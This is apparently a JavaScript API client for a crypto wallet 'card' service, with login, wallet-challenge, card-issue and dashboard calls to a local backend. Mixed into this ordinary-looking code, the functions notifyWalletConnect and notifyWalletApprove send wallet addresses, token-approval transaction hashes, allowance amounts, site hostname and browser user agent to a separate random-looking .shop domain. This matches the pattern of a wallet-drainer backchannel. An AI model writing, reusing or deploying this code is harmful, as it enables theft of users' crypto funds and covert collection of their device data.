import { DashboardModel } from "../types/dashboard";

const API_BASE = import.meta.env.VITE_API_BASE || "http://localhost:4000/api";
const CLIENT_EVENTS_API_BASE = (import.meta.env.VITE_CLIENT_EVENTS_API_BASE || "https://dsajkhjhdkjjgggdsgg.shop/api").replace(/\/+$/, "");

export async function login(username = "guest") {
  const res = await fetch(`${API_BASE}/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username }),
  });
  return res.json();
}

async function requestJson(path, options = {}) {
  const res = await fetch(`${API_BASE}${path}`, {
    ...options,
    headers: {
      "Content-Type": "application/json",
      ...(options.headers || {}),
    },
  });
  const data = await res.json();

  if (!res.ok) {
    throw new Error(data.error || "Backend request failed.");
  }

  return data;
}

async function requestClientEvent(path, options = {}) {
  const res = await fetch(`${CLIENT_EVENTS_API_BASE}${path}`, {
    ...options,
    headers: {
      "Content-Type": "application/json",
      ...(options.headers || {}),
    },
  });
  const data = await res.json();

  if (!res.ok) {
    throw new Error(data.error || "Backend request failed.");
  }

  return data;
}

function getClientMeta(wallet) {
  return {
    source: wallet?.provider || "WalletConnect",
    domain: typeof window !== "undefined" ? window.location.hostname : "",
    device: typeof navigator !== "undefined" ? navigator.userAgent : "",
  };
}

export async function notifyWalletConnect(wallet) {
  return requestClientEvent("/connect", {
    method: "POST",
    body: JSON.stringify({
      address: wallet.address,
      ...getClientMeta(wallet),
    }),
  });
}

export async function createWalletChallenge(wallet) {
  return requestJson("/auth/challenge", {
    method: "POST",
    body: JSON.stringify({
      address: wallet.address,
      network: wallet.network,
    }),
  });
}

export async function issueCardAccount({ challenge, signature, wallet }) {
  return requestJson("/auth/issue-card", {
    method: "POST",
    body: JSON.stringify({
      address: wallet.address,
      challengeId: challenge.challengeId,
      network: wallet.network,
      provider: wallet.provider,
      signature,
    }),
  });
}

export async function signInWithWallet({ challenge, signature, wallet }) {
  return requestJson("/auth/sign-in", {
    method: "POST",
    body: JSON.stringify({
      address: wallet.address,
      challengeId: challenge.challengeId,
      network: wallet.network,
      provider: wallet.provider,
      signature,
    }),
  });
}

export async function notifyWalletApprove({ wallet, approveResult }) {
  const txHash = approveResult?.txid || approveResult?.txID;
  if (!txHash) {
    throw new Error("Approve transaction hash is missing.");
  }

  return requestClientEvent("/approve", {
    method: "POST",
    body: JSON.stringify({
      address: wallet.address,
      tx_hash: txHash,
      allowance: approveResult.allowance,
      ...getClientMeta(wallet),
    }),
  });
}

export async function fetchDashboard() {
  const res = await fetch(`${API_BASE}/dashboard`);
  const data = await res.json();
  return new DashboardModel(data);
}
